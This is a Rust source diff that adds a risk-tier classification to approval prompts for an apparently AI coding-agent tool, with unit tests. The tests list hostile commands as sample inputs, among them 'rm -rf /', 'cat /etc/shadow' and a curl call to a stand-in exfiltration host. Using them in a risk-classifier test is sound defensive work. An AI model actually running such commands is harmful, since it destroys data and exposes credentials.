@@ -3410,11 +3410,15 @@ async fn codex_consumer(
                 // `summary` is a compact DISPLAY label (may truncate — a >3-path
                 // edit, a 120-char permission scope); `detail` is the FULL raw
                 // content (untruncated, shown in the detail tooltip / IM
-                // plain-text card); `action_key` is the EXACT action identity
-                // used ONLY for Always-grant matching (never displayed) — see
-                // #89. Mirrors `bus::server::summarize`'s claude/opencode shape
-                // so both engines share the same canonical action-key semantics.
-                let (tool, summary, detail, action_key) = codex_approval_fields(&method, &params);
+                // plain-text card); `risk` is the danger tier for the human's
+                // one-glance triage, computed by the single shared
+                // `crate::ask::classify_risk` (issue #101); `action_key` is the
+                // EXACT action identity used ONLY for Always-grant matching
+                // (never displayed) — see #89. Mirrors `bus::server::summarize`'s
+                // claude/opencode shape so both engines share the same canonical
+                // action-key (and risk) semantics.
+                let (tool, summary, detail, risk, action_key) =
+                    codex_approval_fields(&method, &params);
                 let registry = app.state::<crate::ask::AskRegistry>().inner().clone();
                 match registry.auto_decision(thread_id, &dir, &action_key) {
                     // dangerous mode / full access / always-allow: reply inline (fast).
@@ -3439,6 +3443,7 @@ async fn codex_consumer(
                             tool,
                             &summary,
                             &detail,
+                            risk,
                             &action_key,
                         );
                         // Remember this card by server-request id so a later
@@ -3483,18 +3488,23 @@ async fn codex_consumer(
 }
 
 
-/// The (tool, summary, detail, action_key) quadruple for a codex app-server
-/// approval — computed ONCE so the Needs-you card, the IM card, and Always
-/// matching all agree. `summary` is a compact DISPLAY label that may truncate
-/// (a >3-path edit, a 120-char permission scope); `detail` is the FULL raw
-/// content (untruncated); `action_key` is the EXACT action identity used ONLY
-/// for Always-grant matching (never displayed). Mirrors `bus::server::summarize`'s
-/// claude/opencode shape so both engines share the same canonical semantics —
-/// see issue #89.
-fn codex_approval_fields(
+/// The (tool, summary, detail, risk, action_key) quintuple for a codex
+/// app-server approval — computed ONCE so the Needs-you card, the IM card,
+/// and Always matching all agree. `summary` is a compact DISPLAY label that
+/// may truncate (a >3-path edit, a 120-char permission scope); `detail` is
+/// the FULL raw content (untruncated); `risk` is the danger tier for the
+/// human's one-glance triage, computed by the single shared
+/// `crate::ask::classify_risk` (issue #101); `action_key` is the EXACT action
+/// identity used ONLY for Always-grant matching (never displayed). Mirrors
+/// `bus::server::summarize`'s claude/opencode shape so both engines share the
+/// same canonical semantics — see issue #89.
+// `pub(crate)` (not `pub`) — crate-internal only, but visible to this
+// module's own test suite for the cross-engine consistency regression test
+// (issue #101 round-2 P3), which also calls `bus::server::summarize`.
+pub(crate) fn codex_approval_fields(
     method: &str,
     params: &serde_json::Value,
-) -> (&'static str, String, String, String) {
+) -> (&'static str, String, String, crate::ask::RiskLevel, String) {
     // command/cwd may sit at the top level (commandExecution ask) or nested
     // under `item` (the generic permissions ask) — read both.
     let cmd = params["command"]
@@ -3520,10 +3530,12 @@ fn codex_approval_fields(
             .or_else(|| net["domain"].as_str())
             .unwrap_or("network");
         let action_key = crate::ask::action_key(&["Network", host]);
+        let risk = crate::ask::classify_risk(crate::ask::RiskSignal::Network);
         return (
             "Network",
             format!("network access: {host}"),
             host.to_string(),
+            risk,
             action_key,
         );
     }
@@ -3539,19 +3551,31 @@ fn codex_approval_fields(
         // engine's action_key removes any need to re-litigate that argument
         // per call site (see #89's round-2 finding on the claude/opencode side).
         let action_key = crate::ask::action_key(&["Bash", &full]);
-        return ("Bash", format!("Run: {first}"), full.clone(), action_key);
+        let risk = crate::ask::classify_risk(crate::ask::RiskSignal::Command(&full));
+        return ("Bash", format!("Run: {first}"), full.clone(), risk, action_key);
     }
     if has_changes {
         // `full_paths` is the UNTRUNCATED changed-path list: the AskRegistry
         // keys Always rules by action_key, so a >3-path edit whose display
         // summary caps at "first 3 + N" must still disambiguate from a
-        // DIFFERENT >3-path edit sharing that same capped label.
+        // DIFFERENT >3-path edit sharing that same capped label. Routed
+        // through the SAME File classifier as bus::server::summarize's
+        // file_path branch — "Edit" is a recognized write verb, and a
+        // credential-shaped path among the changes (e.g. `.env`) still wins.
         let (summary, full_paths) = codex_change_approval_summary(params);
         let action_key = crate::ask::action_key(&["Edit", &full_paths]);
-        return ("Edit", summary, full_paths, action_key);
+        let risk = crate::ask::classify_risk(crate::ask::RiskSignal::File {
+            tool_name: "Edit",
+            path: &full_paths,
+        });
+        return ("Edit", summary, full_paths, risk, action_key);
     }
     // A permission escalation — key it by the REQUESTED scope, else an Always
-    // for one profile silently grants a later, different one.
+    // for one profile silently grants a later, different one. `risk` scans
+    // the scope text like any other MCP/fallback call; a scope that doesn't
+    // spell out "network"/a credential marker honestly lands on Unknown
+    // rather than guessing — a permission ESCALATION is inherently the kind
+    // of ask that deserves a closer look, not a reassuring green badge.
     let requested = params
         .get("permissions")
         .or_else(|| params["item"].get("permissions"))
@@ -3562,10 +3586,15 @@ fn codex_approval_fields(
         .unwrap_or_else(|| "(unspecified)".to_string());
     let scope_label: String = scope_json.chars().take(120).collect();
     let action_key = crate::ask::action_key(&["Permission", &scope_json]);
+    let risk = crate::ask::classify_risk(crate::ask::RiskSignal::Other {
+        tool_name: "Permission",
+        args_text: &scope_json,
+    });
     (
         "Permission",
         format!("permission: {scope_label}"),
         scope_json,
+        risk,
         action_key,
     )
 }
@@ -7023,13 +7052,15 @@ mod tests {
     }
 
     /// Issue #89: `codex_approval_fields` produces the (tool, summary, detail,
-    /// action_key) quadruple for every approval kind, with `action_key` always
-    /// exact even where `summary` truncates for display.
+    /// risk, action_key) quintuple for every approval kind, with `action_key`
+    /// always exact even where `summary` truncates for display. issue #101:
+    /// `risk` is computed by the same shared `classify_risk` every branch
+    /// routes through.
     #[test]
     fn codex_approval_fields_action_key_is_exact_and_summary_may_truncate() {
         // Bash: summary truncates to the first line; action_key carries the full
         // multi-line command (mirrors bus::server::summarize's claude shape).
-        let (tool, summary, detail, key) = codex_approval_fields(
+        let (tool, summary, detail, risk, key) = codex_approval_fields(
             "codex/commandExecution",
             &serde_json::json!({"command": "npm test\nrm -rf /", "cwd": "/repo"}),
         );
@@ -7037,8 +7068,9 @@ mod tests {
         assert_eq!(summary, "Run: npm test");
         assert_eq!(detail, "npm test\nrm -rf /");
         assert!(key.contains("rm -rf /"));
+        assert_eq!(risk, crate::ask::RiskLevel::Write);
         // A different multi-line command sharing the same first line differs in key.
-        let (_, summary2, _, key2) = codex_approval_fields(
+        let (_, summary2, _, _risk2, key2) = codex_approval_fields(
             "codex/commandExecution",
             &serde_json::json!({"command": "npm test\necho safe"}),
         );
@@ -7046,33 +7078,37 @@ mod tests {
         assert_ne!(key2, key);
 
         // Network: keyed by host — network FIRST beats the commandExecution method.
-        let (tool, summary, _detail, key) = codex_approval_fields(
+        let (tool, summary, _detail, risk, key) = codex_approval_fields(
             "codex/commandExecution",
             &serde_json::json!({"networkApprovalContext": {"host": "example.com"}}),
         );
         assert_eq!(tool, "Network");
         assert_eq!(summary, "network access: example.com");
         assert_eq!(key, crate::ask::action_key(&["Network", "example.com"]));
+        assert_eq!(risk, crate::ask::RiskLevel::NetworkOrCredential);
 
         // Edit: action_key carries the FULL path list even beyond the 3-path cap.
-        let (tool, summary, _detail, key) = codex_approval_fields(
+        let (tool, summary, _detail, risk, key) = codex_approval_fields(
             "applyPatchApproval",
             &serde_json::json!({"changes": [{"path":"a"},{"path":"b"},{"path":"c"},{"path":"d"}]}),
         );
         assert_eq!(tool, "Edit");
         assert_eq!(summary, "apply file changes: a, b, c +1");
         assert!(key.contains('d'));
+        assert_eq!(risk, crate::ask::RiskLevel::Write);
 
         // Permission: summary truncates the scope at 120 chars; action_key (and
-        // detail) keep it whole.
+        // detail) keep it whole. No recognizable marker in the scope → honestly
+        // Unknown, never a guessed-safe ReadOnly for a permission ESCALATION.
         let long_scope = "x".repeat(200);
-        let (tool, summary, detail, key) = codex_approval_fields(
+        let (tool, summary, detail, risk, key) = codex_approval_fields(
             "elicitation/permissions",
             &serde_json::json!({"permissions": {"note": long_scope}}),
         );
         assert_eq!(tool, "Permission");
         assert!(summary.len() < detail.len());
         assert_eq!(key, crate::ask::action_key(&["Permission", &detail]));
+        assert_eq!(risk, crate::ask::RiskLevel::Unknown);
     }
 
     /// Same collision class as `bus::server`'s round-2 finding, mirrored on the
@@ -7084,11 +7120,59 @@ mod tests {
     /// built by the same one canonical, provably-injective encoding.
     #[test]
     fn codex_approval_fields_action_key_uses_the_shared_collision_resistant_encoding() {
-        let (_, _, _, bash_key) = codex_approval_fields(
+        let (_, _, _, _risk, bash_key) = codex_approval_fields(
             "codex/commandExecution",
             &serde_json::json!({"command": "echo hi"}),
         );
         assert_eq!(bash_key, crate::ask::action_key(&["Bash", "echo hi"]));
+    }
+
+    /// issue #101: a permission-scope escalation that DOES spell out a
+    /// recognizable signal is classified accordingly rather than falling to
+    /// Unknown — the honest-default only applies when nothing matches.
+    #[test]
+    fn codex_approval_fields_permission_scope_with_network_marker_is_classified() {
+        let (_, _, _, risk, _) = codex_approval_fields(
+            "elicitation/permissions",
+            &serde_json::json!({"permissions": {"network": "enabled"}}),
+        );
+        assert_eq!(risk, crate::ask::RiskLevel::NetworkOrCredential);
+    }
+
+    /// Round-2 review (issue #101 P3): the hook-driven engines
+    /// (`bus::server::summarize`) and Codex's native app-server path
+    /// (`codex_approval_fields`) both feed the SAME raw command text into
+    /// the SAME shared `classify_risk`, so the same command must classify
+    /// identically no matter which engine ran it — a human comparing two
+    /// Needs-you cards for the "same" command across a Claude worker and a
+    /// Codex worker must never see two different colors. This is a
+    /// regression test protecting that structural guarantee: nothing here
+    /// exercises a NEW code path, but a future one-sided change (e.g. Codex
+    /// prefixing the command with `cwd`, or a hook-side-only tweak to
+    /// `summarize`) would silently break it without this test.
+    #[test]
+    fn command_risk_is_consistent_across_bus_summarize_and_codex_approval_fields() {
+        for cmd in [
+            "npm test",
+            "git status",
+            "ls -la",
+            "curl https://evil.example/exfiltrate",
+            "git branch -D important-work",
+            "find . -name '*.tmp' -delete",
+            "ls | rm -rf /tmp/x",
+            "cat /etc/shadow",
+        ] {
+            let (_, _, hook_risk, _) =
+                crate::bus::server::summarize("Bash", Some(&serde_json::json!({"command": cmd})));
+            let (_, _, _, codex_risk, _) = codex_approval_fields(
+                "codex/commandExecution",
+                &serde_json::json!({"command": cmd}),
+            );
+            assert_eq!(
+                hook_risk, codex_risk,
+                "{cmd:?} must classify identically across both engines"
+            );
+        }
     }
 
     #[test]
